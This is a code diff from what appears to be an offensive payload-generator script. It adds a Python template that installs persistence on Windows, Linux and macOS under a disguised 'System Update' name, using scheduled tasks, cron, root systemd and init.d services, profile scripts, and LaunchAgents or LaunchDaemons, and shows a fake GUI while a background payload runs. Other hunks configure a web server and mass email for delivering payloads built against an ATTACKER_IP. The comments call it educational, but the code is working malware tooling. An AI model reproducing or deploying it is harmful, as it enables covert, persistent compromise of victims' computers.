+        elif PERSISTENCE_METHOD == "scheduled_task":
+            # Create scheduled task
+            task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+            subprocess.run(task_cmd, shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
+
+def setup_persistence_linux():
+    """Set up persistence on Linux"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        # Get current executable path
+        exe_path = os.path.abspath(sys.argv[0])
+        
+        # Linux persistence based on selected method
+        if PERSISTENCE_METHOD == "cron":
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif PERSISTENCE_METHOD == "linux_systemd":
+            # Create systemd service
+            service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+            
+            service_path = "/lib/systemd/system/system-update.service"
+            with open(service_path, "w") as f:
+                f.write(service_content)
+                
+            subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+            
+        elif PERSISTENCE_METHOD == "init_script":
+            # Create init.d script
+            init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=\$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+            
+            init_path = "/etc/init.d/system-update"
+            with open(init_path, "w") as f:
+                f.write(init_script)
+                
+            os.chmod(init_path, 0o755)
+            subprocess.run("chkconfig --add system-update", shell=True, check=False)
+            
+        elif PERSISTENCE_METHOD == "profile_mod":
+            # Add to profile
+            profile_path = "/etc/profile.d/system-update.sh"
+            with open(profile_path, "w") as f:
+                f.write(f"#!/bin/bash\n{exe_path} &\n")
+            os.chmod(profile_path, 0o755)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
+
+def setup_persistence_macos():
+    """Set up persistence on macOS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        # Get current executable path
+        exe_path = os.path.abspath(sys.argv[0])
+        
+        # macOS persistence based on selected method
+        if PERSISTENCE_METHOD == "macos_launchagent":
+            # Create LaunchAgent
+            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+            
+            plist_path = "/Library/LaunchAgents/com.system.update.plist"
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+        elif PERSISTENCE_METHOD == "macos_launchdaemon":
+            # Create LaunchDaemon
+            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+            
+            plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+        elif PERSISTENCE_METHOD == "login_item":
+            # Add to login items
+            script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+            subprocess.run(["osascript", "-e", script], check=False)
+            
+        elif PERSISTENCE_METHOD == "cron":
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+        
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the detected OS"""
+    detected_os = detect_os()
+    
+    if detected_os == "Windows":
+        setup_persistence_windows()
+    elif detected_os == "Linux":
+        setup_persistence_linux()
+    elif detected_os == "macOS":
+        setup_persistence_macos()
+    else:
+        # Unknown OS, skip persistence
+        pass
+
+def execute_payload_windows():
+    """Execute Windows-specific payload code"""
+    # Simulate Windows-specific payload action
+    time.sleep(2)
+
+def execute_payload_linux():
+    """Execute Linux-specific payload code"""
+    # Simulate Linux-specific payload action
+    time.sleep(2)
+
+def execute_payload_macos():
+    """Execute macOS-specific payload code"""
+    # Simulate macOS-specific payload action
+    time.sleep(2)
+
+def execute_payload():
+    """Execute the appropriate payload based on the detected OS"""
+    detected_os = detect_os()
+    
+    if detected_os == "Windows":
+        execute_payload_windows()
+    elif detected_os == "Linux":
+        execute_payload_linux()
+    elif detected_os == "macOS":
+        execute_payload_macos()
+    else:
+        # Unknown OS, execute generic payload
+        time.sleep(2)
+
+def main():
+    # First, set up persistence
+    setup_persistence()
+    
+    # Then execute the payload
+    if FAKE_GUI:
+        # Run payload in background thread
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        
+        # Run Fake GUI in foreground
+        run_fake_gui()
+        
+        # Wait for payload to finish (optional, or just let it be daemon)
+        t.join()
+    else:
+        execute_payload()
+
+if __name__ == "__main__":
+    main()
+EOF
 }
 
 # Educational payload templates
@@ -4070,7 +4545,7 @@ def index():
         <div class="info">
             <h3>File Information</h3>
             <p><strong>Filename:</strong> $(basename "$payload_path")</p>
-            <p><strong>Size:</strong> $(stat -f%z "$payload_path" 2>/dev/null || stat -c%s "$payload_path") bytes</p>
+            <p><strong>Size:</strong> $(get_file_size "$payload_path") bytes</p>
             <p><strong>Type:</strong> Secure Executable</p>
             <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
         </div>
@@ -4100,7 +4575,7 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=$local_port, debug=False)
 EOF
     
-    chmod +x "$server_script"
+    set_executable "$server_script"
     
     # Start the HTTP server in background
     echo -e "${Y}[*] Starting HTTP server on port $local_port...${NC}"
@@ -4281,7 +4756,7 @@ if __name__ == "__main__":
     send_email(recipient, payload_path, template_path)
 EOF
     
-    chmod +x "$email_script"
+    set_executable "$email_script"
     
     # Send to all recipients
     IFS=',' read -ra RECIPIENTS <<< "$recipients"
@@ -4351,9 +4826,9 @@ main() {
     setup_environment
     
     if generate_payload "$PAYLOAD_TYPE" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
-        if [ "$TARGET_OS" == "Cross-platform" ]; then
-            echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
-            echo -e "${G}>> Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
+        if [ "$TARGET_OS" == "Multi-OS" ]; then
+            echo -e "${G}>> MULTI-OS PAYLOAD GENERATION COMPLETE. Check the 'multi_os_builds' directory.${NC}"
+            echo -e "${G}>> This payload will auto-detect the target OS and execute the appropriate code.${NC}"
             if [ "$FAKE_GUI_ENABLED" = true ]; then
                 echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
             else
@@ -4365,7 +4840,7 @@ main() {
             else
                 echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
             fi
-            log_message "SUCCESS" "Cross-platform payload generation completed successfully"
+            log_message "SUCCESS" "Multi-OS payload generation completed successfully"
         else
             echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
             echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
@@ -4387,8 +4862,8 @@ main() {
         if [ -n "$DELIVERY_METHOD" ]; then
             # Get the full path to the payload
             local payload_full_path
-            if [ "$TARGET_OS" == "Cross-platform" ]; then
-                payload_full_path="$(pwd)/../cross_platform_builds"
+            if [ "$TARGET_OS" == "Multi-OS" ]; then
+                payload_full_path="$(pwd)/../multi_os_builds/$FINAL_NAME"
             else
                 payload_full_path="$(pwd)/../$FINAL_NAME"
             fi
